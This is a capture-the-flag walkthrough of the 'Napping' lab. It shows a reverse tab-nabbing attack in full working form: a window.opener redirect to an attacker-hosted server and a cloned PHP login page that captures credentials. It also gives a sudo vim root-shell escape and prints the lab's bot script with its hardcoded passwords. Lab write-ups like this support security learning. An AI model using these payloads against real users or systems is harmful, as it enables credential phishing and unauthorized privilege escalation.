# Napping

- Recon revealed 22 and 80. 
- On 80 was a website with a login form (on index.php), register page, reset password page, and a welcome page where you could submit any link with the promise the admin would 'review' it.
- Additionally, there was an /admin/login.php page.

## Foothold

This room was quite tricky - it took me a while to make the connection from the name and the hint: 

**To hack into this machine, you must look at the source and focus on the target.**

Initially I tried XSS but that wasn't working - it seemed to, as in I could place payloads that would affect myself, but the admin wasn't affected. Eventually I made the jump from 'target' and napping - after submitting a link, it was presented back to you as a hyperlink. This was setup with `target="_blank"` - if the admin was setup the same way, then this might be vulnerable to a **tab napping** attack, also called a tab na**bb**ing attack.

> Tab napping is a form of phishing: you create a link with target `_blank`, which will open in a new tab. On the page the user opens, you have script that manipulates the tab the user just came from, via `window.opener`. The idea is while they are on your new tab, you change their old tab into a cloned login form or similar, in the hope that when they return they assume their session has timed out and they re-login.

Also a good link for this: https://book.hacktricks.xyz/pentesting-web/reverse-tab-nabbing

So I set this up, using a PHP webserver on my attack box (`php -S 0.0.0.0:1234` - I had to install the PHP cli on the THM attack box), hosting two files:

**landing.html**:

```html
<script>
        window.opener.location = 'http://10.10.150.135:1234/login.php';
</script>
```

and **login.php**, which logs any input it gets to std out:

```php
<?php
if (isset($_POST["username"])) {
        $stdout = fopen('php://stdout', 'w');
        fwrite($stdout, $_POST["username"] . ":" . $_POST["password"]);
}
?>


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Login</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <style>
        body{ font: 14px sans-serif; }
        .wrapper{ width: 360px; padding: 20px; }
    </style>
</head>
<body>
    <div class="wrapper">

        <h2>Login</h2>
        <p>Please fill in your credentials to login.</p>


        <form method="post">
            <div class="form-group">
                <label>Username</label>
                <input type="text" name="username" class="form-control " value="">
                <span class="invalid-feedback"></span>
            </div>
            <div class="form-group">
                <label>Password</label>
                <input type="password" name="password" class="form-control ">
                <span class="invalid-feedback"></span>
            </div>
            <div class="form-group">
                <input type="submit" class="btn btn-primary" value="Login">
            </div>
            <p>Don't have an account? <a href="register.php">Sign up now</a>.</p>
        </form>
    </div>
</body>
</html>
```

Few notes about the above. I spent hours on this and couldn't get it working, because I was cloning the *wrong* login page. As I eventually discovered, the script simulating the admin looks for the presence of the work 'Admin' in the text - if it finds it it posts, otherwise it does nothing.

With this setup, submitting the landing.html url to the form would result in the admin visiting it (on a 1 minute schedule), then visiting my login.php, and then submitting their credentials. These credentials worked to get ssh as `daniel`.

## Path to root

After getting past the tab napping, the rest was easy.

- daniel was a member of the administrators group, which allowed him to write a file called query.py in the other user's home folder, /home/adrian
- adding a reverse shell payload to this (or any python, like something which copied `sh` and set the suid bit) allowed me to get a session as adrian.
- adrian could run vim as sudo, so I got a root shell with `sudo vim -c ':!/bin/sh'`

## Bonus

The script used to simulate the admin for this was as follows:

```python
import requests
import re
import mysql.connector
import string
import random

mydb = mysql.connector.connect(
        host="localhost",
        user="adrian",
        password="Stop@Napping3!",
        database="website"
        )

mycursor = mydb.cursor()

mycursor.execute("SELECT * FROM links")

myresult = mycursor.fetchall()

data = {
        "username":"daniel",
        "password":"C@ughtm3napping123"
        }

N = 26

cookie =  ''.join((random.choice(string.ascii_lowercase + string.digits) for x in range(N)))

headers = {
        "PHPSESSID":cookie,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
        }

for x in myresult:
    url1 = x[0]


    try:
        r1 = requests.get(url1,headers=headers,timeout=2)
        search = r1.text
        if (search.find('location.replace') != -1):
            match = re.findall("http(.*)\);",search)
            new_url = 'http' + match[0].rstrip(match[0][-1])
            r2 = requests.get(new_url,headers=headers,timeout=2)
            admin_search = r2.text

            if (admin_search.find('Admin') != -1):
                r3 = requests.post(new_url,data=data,headers=headers,timeout=2)

        elif (search.find('opener.location') != -1):
            match = re.findall("http(.*);",search)
            new_url = 'http' + match[0].rstrip(match[0][-1])
            r2 = requests.get(new_url,headers=headers,timeout=2)
            admin_search = r2.text

            if (admin_search.find('Admin') != -1):
                r3 = requests.post(new_url,data=data,headers=headers,timeout=2)

    except requests.exceptions.ReadTimeout:
        continue
```

Quite clever, while also a little dumb: as its not actually processing the javascript, you can have a fun time trying to get clever with the xss to no avail. I tried stealing the cookie multiple ways, which is funny as above its shown that its completely random. Also doing something like `window.opener = <my url> + document.cookie` would result in some weird outputs, specifically receiving a request like `/+document.cookie`.

Finally, it also means you can probably hack the above with one file (could be done with some sort of netcat thing or php id wager):

```
Admin
location.replace("http://10.10.170.246:4444")
```
